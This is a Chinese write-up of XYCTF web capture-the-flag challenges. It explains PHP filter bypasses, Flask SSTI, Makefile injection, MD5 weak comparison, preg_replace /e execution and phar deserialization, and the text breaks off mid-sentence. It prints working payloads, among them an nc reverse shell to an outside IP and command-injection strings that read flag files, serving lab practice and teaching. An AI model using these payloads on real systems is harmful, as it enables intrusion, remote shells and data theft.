        <content type="html"><![CDATA[<h1 id="XYCTF"><a href="#XYCTF" class="headerlink" title="XYCTF"></a>XYCTF</h1><h3 id="ezhttp（http协议）"><a href="#ezhttp（http协议）" class="headerlink" title="ezhttp（http协议）"></a>ezhttp（http协议）</h3><p>开题是个登录框，看下源码有啥</p><p><img src="https://bu.dusays.com/2024/06/05/6660852a2657a.png" alt="image-20240402204312236.png"></p><p>主办方说了不能用扫描器，盲猜一手<code>/robots.txt</code></p><p><img src="https://bu.dusays.com/2024/06/05/66608529c5a3e.png" alt="image-20240402204422706.png"></p><p>访问<code>/l0g1n.txt</code></p><p><img src="https://bu.dusays.com/2024/06/05/66608529cbc9b.png" alt="image-20240402204501210.png"></p><p>登录后就是打常规的http协议了，payload</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">User-Agent: XYCTF </span></span><br><span class="line"><span class="section">Client-ip:127.0.0.1</span></span><br><span class="line"><span class="section">via:ymzx.qq.com</span></span><br><span class="line"><span class="section">Referer: yuanshen.com</span></span><br><span class="line"><span class="section">Cookie: XYCTF</span></span><br></pre></td></tr></table></figure><h3 id="牢牢记住，逝者为大（nc反弹shell、绕过字符串拼接rce）"><a href="#牢牢记住，逝者为大（nc反弹shell、绕过字符串拼接rce）" class="headerlink" title="牢牢记住，逝者为大（nc反弹shell、绕过字符串拼接rce）"></a>牢牢记住，逝者为大（nc反弹shell、绕过字符串拼接rce）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br></pre></td></tr></table></figure><p>过滤了很多，虽然有些命令执行函数没过滤，但echo过滤了就导致没有回显，没回显那就反弹shell，对于<code>eval(&quot;#man,&quot; . $cmd . &quot;,mamba out&quot;);</code>，绕过前面字符串用换行符<code>%0a</code>，后面就用注释符<code>%23</code>。限制了长度，那就再引入个变量就行，长度小于7只能引用GET方法，因为他遍历的又是整个GET方法传的参数，所以正则匹配对引入的变量也有效。过滤了a，不能用bash反弹，用nc，过滤bin关键字，中间插个<code>&#39;&#39;</code>就行，payload：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=%0a`<span class="variable">$_GET</span>[1]`;%23&amp;1=nc 121.40.195.194 2333 -e /b<span class="string">&#x27;&#x27;</span><span class="keyword">in</span>/sh</span></span><br></pre></td></tr></table></figure><h3 id="我是一个复读机（ssti过滤单双引号、下划线、关键字）"><a href="#我是一个复读机（ssti过滤单双引号、下划线、关键字）" class="headerlink" title="我是一个复读机（ssti过滤单双引号、下划线、关键字）"></a>我是一个复读机（ssti过滤单双引号、下划线、关键字）</h3><p>开题给了提示用户名为<code>admin</code>，密码也给了字典，跑一下就出了，很贴心，好评，上次nk如果不是ljl给我说密码就爆0了，密码是<code>asdqwe</code>，进来后</p><p><img src="https://bu.dusays.com/2024/06/05/6660852d08fca.png" alt="image-20240402203112980.png"></p><p>不管输啥都是回显你输的，除了输入waf会回显</p><p><img src="https://bu.dusays.com/2024/06/05/6660852a5167f.png" alt="image-20240402203217837.png"></p><p>输入中文会出现</p><p><img src="https://bu.dusays.com/2024/06/05/6660852d6663a.png" alt="image-20240402203300273.png"></p><p>后面出现<code>&#123;&#123;&#125;&#125;</code>，看起来像个ssti，而且不用输<code>&#123;&#123;&#125;&#125;</code>，输入<code>你好7*7</code>，回显</p><p><img src="https://bu.dusays.com/2024/06/05/6660852a441e3.png" alt="image-20240402203359796.png"></p><p>确定是ssti了，手测了一下，过滤了<code>_</code>、<code>&#39;</code>、<code>&quot;</code>、<code>flag</code>、<code>system</code>，还有其他的啥，最终payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sentence=你好(lipsum|attr(request.<span class="keyword">values</span>.a)).<span class="keyword">get</span>(request.<span class="keyword">values</span>.b).popen(request.<span class="keyword">values</span>.c).<span class="keyword">read</span>()&amp;a=__globals__&amp;b=os&amp;c=cat /flag</span><br></pre></td></tr></table></figure><blockquote><p>解释一下上述代码：lipsum是flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块，request.values.x表示接受所有参数，包括get传参和post传参。这里就是先用lipsum得到builtins，然后从中获取了 <code>os</code> 模块，并使用 <code>os.popen()</code> 执行了一个命令</p></blockquote><p>这里注意要用GET传参，直接输在框里不行，应该是他把输在框里的都当作字符串处理了，就导致<code>&amp;</code>失效了</p><h3 id="ezMake-（makefile命令）"><a href="#ezMake-（makefile命令）" class="headerlink" title="ezMake （makefile命令）"></a>ezMake （makefile命令）</h3><p>进题是个输入框</p><p><img src="https://bu.dusays.com/2024/06/05/6660852a11371.png" alt="image-20240402205222232.png"></p><p>搜索了一下makefile命令，直接出了，payload：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">shell</span><span class="language-bash"> <span class="built_in">cat</span> flag)</span></span><br></pre></td></tr></table></figure><blockquote><p>解析：在Makefile中，<code>$(shell)</code> 是一个函数，用于执行系统命令并将其输出作为字符串返回。这个命令会读取名为 <code>flag</code> 的文件的内容，并将其作为字符串返回给Makefile。</p></blockquote><h3 id="ez-Make（makefile命令过滤-、-、关键字）"><a href="#ez-Make（makefile命令过滤-、-、关键字）" class="headerlink" title="ez?Make（makefile命令过滤$、&#x2F;、关键字）"></a>ez?Make（makefile命令过滤$、&#x2F;、关键字）</h3><p>跟上面那题一样，waf多了<code>$</code>、<code>flag</code>、<code>shell</code>、<code>/</code>啥的很多都用不了，感觉用了一种非预期，猜flag在flag文件中，用正则匹配来绕过关键字过滤，<code>more</code>用于查看文件内容，<code>cd ..</code>来绕过<code>/</code>，payload：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">..</span>&amp;&amp;<span class="keyword">cd</span> <span class="string">..</span>&amp;&amp;<span class="keyword">cd</span> <span class="string">..</span>&amp;&amp;more [e-h][k-m][^-b][e-h]</span><br></pre></td></tr></table></figure><h3 id="ezmd5（md5碰撞）"><a href="#ezmd5（md5碰撞）" class="headerlink" title="ezmd5（md5碰撞）"></a>ezmd5（md5碰撞）</h3><p>开题</p><p><img src="https://bu.dusays.com/2024/06/05/6660852a1db8d.png" alt="image-20240403125853480.png"></p><p>结合题目，判断这个跟上次那个qsnctf2024的那个md5题一样，上次是传入两个pdf文件，然后md5值相同，这里是传入图片，试了下直接改后缀名再用记事本写入两个md5值相同的数好像不行，就搜了一下md5值相同的两张图片，在这里找到两张图片就可以</p><p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value</a></p><h3 id="εZ-¿м-Kε¿-（）"><a href="#εZ-¿м-Kε¿-（）" class="headerlink" title="εZ?¿м@Kε¿?（）"></a>εZ?¿м@Kε¿?（）</h3><p>和上面两道一样，浩哥的payload：<code>$$(&lt;$&lt;)</code></p><blockquote><p>$&lt;代表第一个依赖文件，也就是flag文件，$&lt;前面的&lt;是读的意思，$()也就是执行命令，不知道第一个$啥意思，等赛后看大佬的wp吧</p></blockquote><p><img src="https://bu.dusays.com/2024/06/05/666085f483b04.png" alt="image-20240418200950284.png"></p><h3 id="warm-up（md5弱比较、绕过preg-match、preg-match-e执行）"><a href="#warm-up（md5弱比较、绕过preg-match、preg-match-e执行）" class="headerlink" title="warm up（md5弱比较、绕过preg_match、preg_match &#x2F;e执行）"></a>warm up（md5弱比较、绕过preg_match、preg_match &#x2F;e执行）</h3><p>开题就是源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先第一层</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET<span class="selector-attr">[<span class="string">&#x27;val1&#x27;</span>]</span>) &amp;&amp; <span class="built_in">isset</span>($_GET<span class="selector-attr">[<span class="string">&#x27;val2&#x27;</span>]</span>) &amp;&amp; $_GET<span class="selector-attr">[<span class="string">&#x27;val1&#x27;</span>]</span> != $_GET<span class="selector-attr">[<span class="string">&#x27;val2&#x27;</span>]</span> &amp;&amp; <span class="built_in">md5</span>($_GET<span class="selector-attr">[<span class="string">&#x27;val1&#x27;</span>]</span>) == <span class="built_in">md5</span>($_GET<span class="selector-attr">[<span class="string">&#x27;val2&#x27;</span>]</span></span><br></pre></td></tr></table></figure><p>弱比较绕过不多说</p><p>第二层</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">isset</span><span class="params">(<span class="variable">$md5</span>)</span></span> &amp;&amp; <span class="variable">$md5</span> == <span class="built_in">md5</span>(<span class="variable">$md5</span>)</span><br></pre></td></tr></table></figure><p>传个MD5前后都是0e开头的即可，虽然没说md5咋赋值，但因为开头有<code>extract($_GET);</code>，所以直接用GET方法对md5传参即可</p><p>第三层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>XYCTF_550102591</code>md5加密后是0e开头，所以对XY传个md5后是0e开头的值即可，XYCTF的值在源码开头就给出了，这里我们对其用GET传参把其值改变即可，最终payload：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?val1=QNKCDZO<span class="variable">&amp;val2</span>=<span class="number">240610708</span><span class="variable">&amp;md5</span>=<span class="number">0e215962017</span><span class="variable">&amp;</span>XY=s878926199a<span class="variable">&amp;</span>XYCTF=s878926199a</span><br></pre></td></tr></table></figure><p>然后访问<code>/LLeeevvveeelll222.php</code>路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (<span class="name">isset</span>($_POST[&#x27;a&#x27;]) <span class="symbol">&amp;&amp;</span> !preg_match(&#x27;/[<span class="number">0</span><span class="number">-9</span>]/&#x27;, $_POST[&#x27;a&#x27;]) <span class="symbol">&amp;&amp;</span> intval($_POST[&#x27;a&#x27;])) </span><br></pre></td></tr></table></figure><p>数组绕过，preg_match遇到数组会返回false</p><p>第二层</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace($_GET[<span class="string">&#x27;a&#x27;</span>],$_GET[<span class="string">&#x27;b&#x27;</span>],$_GET[<span class="string">&#x27;c&#x27;</span>])</span><br></pre></td></tr></table></figure><p>&#x2F;e执行绕过，官方文档：<a href="https://www.php.net/manual/zh/function.preg-replace.php">PHP: preg_replace - Manual</a>，简单来说就是搜索第三个参数中匹配第一个参数的部分， 以第二个参数进行替换，然后将替换后的字符串作为php代码使用eval方式进行执行并返回结果，payload：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?a=/22/e<span class="variable">&amp;b</span>=<span class="meta">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);<span class="variable">&amp;c</span>=22</span><br><span class="line">POST：a[]=1</span><br></pre></td></tr></table></figure><h3 id="pharme（绕过-HALT-COMPILER-检测、php伪协议、无参数rce、-halt-compiler-截断）"><a href="#pharme（绕过-HALT-COMPILER-检测、php伪协议、无参数rce、-halt-compiler-截断）" class="headerlink" title="pharme（绕过__HALT_COMPILER()检测、php伪协议、无参数rce、__halt_compiler();截断）"></a>pharme（绕过__HALT_COMPILER()检测、php伪协议、无参数rce、__halt_compiler();截断）</h3><p>开题是个文件上传</p><p><img src="https://bu.dusays.com/2024/06/05/666085f479348.png" alt="image-20240408225418789.png"></p><p>看源码，最下面有个<code>class.php</code>，访问下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;ch3nx1&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>先别管，这看着应该是文件包含，结合题目，先上传个<code>phar</code>文件再说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$o</span>-&gt;a=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传后他会显示匹配到了<code>__HALT_COMPILER()</code></p><p><img src="https://bu.dusays.com/2024/06/05/666085f483b01.png" alt="image-20240408232203221.png"></p><p>这里就要将phar文件用gzip命令进行压缩（windows下面好像不行，linux下可以），压缩后的文件就没有了<code>__HALT_COMPILER()</code>，然后再将test.phar.gz后缀改为png（测试过png文件可以上传），这里png文件能解析成功的原因：</p><blockquote><p>PHP编译器在遇到<code>phar</code>文件时，只要检测到文件末尾有<code>__HALT_COMPILER();</code>语句，就会认为这是一个<code>phar</code>文件，而不会考虑文件的后缀名</p></blockquote><p>上传成功</p><p><img src="https://bu.dusays.com/2024/06/05/666085f47c8f5.png" alt="image-20240408233220444.png"></p><p>然后再到<code>class.php</code>里进行文件包含，先看第一层：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^phar:\/\//i&#x27;</span>,$_POST[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>参数不能以<code>phar://</code>开头，用伪协议绕过即可</p><p>第二层：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&#x27;ch3nx1&#x27;</span> === preg_replace(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;ch3nx1&#x27;</span>,preg_replace(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd))</span><br></pre></td></tr></table></figure><p>这串代码先是将所有大小写字母、下划线 <code>_</code> 和圆括号 <code>()</code> 替换为空字符串，再将处理后的字符串中的连续分号 <code>;</code> 替换为字符串 <code>&#39;ch3nx1&#39;</code>，这个就用无参数rce绕过即可</p><p>第三层：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>($this-&gt;cmd.<span class="string">&#x27;isbigvegetablechicken!&#x27;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>原本的思路使用注释符啥的，但仔细想想这样就过不了正则了，然后ljl在翻手册时翻到个函数<code>__halt_compiler</code>（tql😍），这里给出官方手册链接：<a href="https://www.php.net/manual/zh/function.halt-compiler.php">PHP: __halt_compiler - Manual</a></p><p>其中有个笔记就很生动地说出了该函数的用法：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If <span class="string">&quot;__halt_compiler();&quot;</span> appears <span class="keyword">in</span> a <span class="built_in">file</span> which <span class="keyword">is</span> <span class="string">&quot;include&quot;</span>d <span class="keyword">or</span> <span class="string">&quot;require&quot;</span>d, <span class="keyword">then</span> <span class="keyword">the</span> called-<span class="keyword">in</span> <span class="built_in">file</span> will be treated <span class="keyword">as</span> <span class="keyword">if</span> <span class="keyword">it</span> physically cuts off <span class="keyword">at</span> <span class="keyword">the</span> <span class="string">&quot;__halt_compiler();&quot;</span>. In other <span class="built_in">words</span>, <span class="string">&quot;__halt_compiler();&quot;</span> only affects <span class="keyword">the</span> 